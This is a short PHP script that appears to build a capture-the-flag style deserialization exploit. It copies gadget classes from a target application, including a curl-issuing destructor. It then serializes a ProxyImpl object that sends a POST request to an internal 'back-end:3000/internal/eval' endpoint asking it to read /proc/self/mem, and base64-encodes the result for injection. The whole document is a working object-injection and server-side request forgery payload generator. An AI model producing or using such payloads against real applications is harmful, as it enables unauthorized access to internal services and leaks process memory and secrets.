<?php

class Utils {
    private $_cleanup_func = ["aaa", "pagination"];
    private $_cleanup_func_args = ["INTERNAL_INCLUDING", true];
    public $should_garbage_once_done = true;

    function __construct()
    {
        $this->_cleanup_func = "define";
    }

    public static function pagination($file_name) {
        $title = '';
        $content = '';
        if (!empty($file_name)) {
            include __DIR__.'/'.basename($file_name).'.inc.php';
        } else {
            include __DIR__.'/home.inc.php';
        }
        
        return array($title, $content);
    }

    // public function __destruct()
    // {
    //     if ($this->should_garbage_once_done) {
    //         if (isset($this->_cleanup_func)) {
    //             call_user_func($this->_cleanup_func, ...$this->_cleanup_func_args);
    //         }
    //     }
        
    // }
}

class ProxyImpl {
    private $url = "http://localhost:3000";
    private $method = "GET";
    private $headers = ["Content-Type" => "application/x-www-form-urlencoded"];
    private $data = "";

    public function __construct($url = "", $method = "GET", $headers=[], $data="") {
        $this->url = $url;
        $this->method = $method;
        $this->headers = $headers;
        $this->data = $data;
    }

    // public function __destruct() {
    //     $ch = curl_init();
    //     curl_setopt($ch, CURLOPT_URL, $this->url.'/garbage_collect');
    //     if ($this->method !== "GET") {
    //         curl_setopt($ch, CURLOPT_POST, true);
    //         if ($this->data) {
    //             curl_setopt($ch, CURLOPT_POSTFIELDS, $this->data);
    //         }
    //     } 
    //     if (count($this->headers)) {
    //         curl_setopt($ch, CURLOPT_HTTPHEADER, $this->headers);
    //     }
    //     curl_exec($ch);
    //     curl_close($ch);
    // }
}



$a = new ProxyImpl("http://back-end:3000/internal/eval?a=", "POST", ["Content-Type" => "application/x-www-form-urlencoded"], "file=/proc/self/mem&offset=0x558a8d1bd693&length=20");
// echo serialize($a);
echo base64_encode(serialize($a));


?>